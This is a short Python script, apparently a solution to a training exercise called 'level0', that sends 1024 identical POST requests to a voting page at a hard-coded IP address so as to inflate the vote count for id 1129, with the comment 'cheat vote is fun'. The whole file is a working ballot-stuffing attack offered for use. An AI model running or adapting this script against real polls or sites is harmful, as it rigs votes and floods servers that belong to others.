#!/usr/bin/python3
# cheat vote is fun
import requests
url = "http://158.69.76.135/level0.php"
id = str(1129)
data_2_post = {
        'id': id,
        'holdthedoor': "Submit"
    }
print("please wait ..")
for req in range(1024):
    requests.post(url, data= data_2_post)
    print("request number {} has been sent to {} with the id: {}".format(req, url, id))

print("done")
